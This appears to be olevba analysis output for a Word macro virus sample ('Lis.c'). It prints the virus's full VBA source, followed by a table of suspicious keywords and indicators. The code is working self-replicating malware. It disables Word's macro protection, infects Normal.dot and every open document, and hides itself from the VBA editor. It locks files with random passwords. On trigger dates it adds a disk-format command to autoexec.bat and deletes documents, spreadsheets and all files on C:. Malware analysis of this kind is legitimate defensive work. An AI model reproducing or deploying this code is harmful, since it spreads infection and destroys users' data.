olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lis.c-b889dea686fd5cdae3becfb5fc7479a5f4f12162
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lis.c-b889dea686fd5cdae3becfb5fc7479a5f4f12162 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'L i s a 2001
'Âñå ïîæåëàíèÿ (à òàêæå íîâûå âèðè) ñëàòü íà Slava_Atrancev@mail.ru
Dim dvl
Private Sub Document_Close()
 dvl = 2
 p
End Sub
Private Sub Document_New()
 dvl = 3
 p
End Sub
Private Sub Document_Open()
 dvl = 1
 p
End Sub

Private Sub p()
 '___Âêëþ÷àåì ãåíåðàòîð ñëó÷àéíûõ ÷èñåë___'
 Randomize
 '___Âûðóáàåì îøèáêè___'
 On Error Resume Next
 '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 97___'
 Application.Options.VirusProtection = False
 '___Îòêëþ÷åíèå çàùèòû îò âèðóñîâ äëÿ âîðäà 2000___'
 System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\9.0\Word\Security", "level") = 1
 If ThisDocument.Name <> "Normal.dot" Then
  '___Åñëè âûïîëíÿåòñÿ íå èç íîðìàëà òî ...___'
  '___Âûòèðàåì íîðìàë äîò___'
  a = Application.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a
  '___Ïèøåì â íîðìàë äîò íàø êîä___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, a)
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines 1, b
  '___Äîáàâëÿåì â íîðìàë òåõíîëîãèþ ñòåëñ___'
  c = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 1, "Sub viewvbcode()"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 2, "On Error Resume Next"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 3, "a = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 4, "NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, a"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 5, "NormalTemplate.Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 6, "c = Application.Documents.Count"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 7, "For i = 1 To c"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 8, "d = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 9, "If d > 0 Then"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 10, "Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, d"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 11, "Application.Documents.Item(i).Saved = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 12, "End If"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 13, "Next i"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 14, "Application.ShowVisualBasicEditor = True"
  NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.insertlines c + 15, "End Sub"
  '___Ìåëêàÿ ïàêîñòü àíòèâèðóñíèêàì, ïðè çàêðûòèè ïàðîëèðóåì äîêóìåíò íà èçìåíåíèå, à ïðè îòêðûòèè ñíèìàåì ïàðîëü è ïîñëå ëå÷åíèÿ, þçâåðü íå ñìîæåò þçàòü ýòîò ôàéë___'
  If dvl = 2 Then
   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:="xdtfspdvcpfi"
  End If
  If dvl = 1 Then
   ThisDocument.Unprotect Password:="xdtfspdvcpfi"
   aa = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   cc = ""
   For dd = 1 To 12
    ee = 0
    Do While ee < 97
    '___Ãåíåðèðóåì ïàðîëü ñëó÷àéíûì îáðàçîì___'
     ee = Int((122 * Rnd) + 1)
    Loop
    cc = cc + Chr(ee)
   Next dd
   For bb = 1 To aa
    nn = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(bb, 1)
    If Mid(nn, 1, 63) = "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:=" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine bb, "   ThisDocument.Protect Type:=wdAllowOnlyFormFields, Password:=" + Chr(34) + cc + Chr(34)
    End If
    If Mid(nn, 1, 36) = "   ThisDocument.Unprotect Password:=" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine bb, "   ThisDocument.Unprotect Password:=" + Chr(34) + cc + Chr(34)
    End If
   Next bb
  End If
 Else
  '___Åñëè âûïîëíÿåòñÿ èç íîðìàëà òî ...___'
  '___Çàïîìèíàåì êîä áåç ïðîöåäóðû ñòåëñ___'
  a = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  d = ""
  For i = 1 To a
   b = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   If b = "Sub viewvbcode()" Then i = a + 1 Else d = d + b + Chr(13)
  Next i
  '___Ïèøåì êîä âî âñå îòêðûòûå ôàéëû___'
  a = Application.Documents.Count
  For i = 1 To a
   b = Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, b
   Application.Documents.Item(i).VBProject.VBComponents.Item(1).CodeModule.insertlines 1, d
  Next i
 End If
 '___Ïðîâåðÿåì íàëè÷èå ìåòêè "Ñâîé-×óæîé"
 Set a = Application.FileSearch
 Set b = Application.FileSearch
 With a
  .LookIn = "c:\windows\system\"
  .FileName = "lisa.dll"
  '___Åñëè ìåòêè íåò, óáèâàåì âñå ïîäðÿä___'
  If .Execute = 0 Then
   If (Day(Now()) = 23) And (Month(Now()) = 2) Or (Day(Now()) = 1) And (Month(Now()) = 1) Or (Day(Now()) = 8) And (Month(Now()) = 3) Or (Day(Now()) = 30) And (Month(Now()) = 4) _
   Or (Day(Now()) = 10) And (Month(Now()) = 1) Or (Day(Now()) = 30) And (Month(Now()) = 8) Or (Day(Now()) = 10) And (Month(Now()) = 7) Or (Day(Now()) = 13) And (Month(Now()) = 12) Then
    Open "c:\autoexec.bat" For Append As #1
     Print #1, "echo y|FORMAT c: /q >nul"
    Close #1
    With b
     .LookIn = "c:\"
     .FileName = "*.doc"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.xls"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
    With b
     .LookIn = "c:\"
     .FileName = "*.*"
     .SearchSubFolders = True
     If .Execute > 0 Then
      For y = 1 To .FoundFiles.Count
       Kill (.FoundFiles(y))
      Next y
     End If
    End With
   End If
  End If
 End With
End Sub




















































































































































































































































































































































































































































































































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lisa.dll            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
